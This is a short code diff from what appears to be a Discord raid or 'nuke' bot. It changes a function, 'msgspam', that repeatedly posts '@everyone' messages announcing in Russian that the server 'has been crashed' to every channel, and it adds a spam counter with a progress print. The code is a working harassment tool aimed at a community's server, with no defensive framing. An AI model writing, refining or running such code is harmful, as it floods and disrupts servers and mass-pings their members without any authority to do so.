@@ -78,9 +78,12 @@ async def clearemj(ctx):
 			continue
 
 async def msgspam(ctx):
-	for a in range(1000):
+	spamed = 0
+	for a in range(100):
 		for channel in ctx.guild.channels:
 			try:
+				spamed += 1
+				print(f'наспамил {spamed}/100')
 				await channel.send('@everyone сервер был крашнут!')
 			except:
 				continue
